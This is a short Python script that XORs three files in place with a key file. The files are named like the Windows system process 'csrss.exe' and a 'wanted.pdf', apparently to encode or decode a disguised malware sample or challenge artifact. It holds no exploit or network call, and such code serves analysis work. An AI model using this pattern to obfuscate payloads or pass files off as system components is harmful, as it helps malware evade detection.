import os

def xor_file(file_path, key_path):
    try:
        with open(key_path, 'rb') as key_file:
            key = key_file.read()

        with open(file_path, 'rb') as file:
            file_content = bytearray(file.read())

        key_length = len(key)

        for i in range(len(file_content)):
            file_content[i] ^= key[i % key_length]

        with open(file_path, 'wb') as file:
            file.write(file_content)

        print(f"File '{file_path}' has been successfully XORed.")
    except Exception as e:
        print(f"An error occurred while processing the file: {e}")

file_paths = [
    "csrss.exe",
    "csrss.exe.config",
    "wanted.pdf"
]

key_path = "csrss.dll"

for file_path in file_paths:
    xor_file(file_path, key_path)
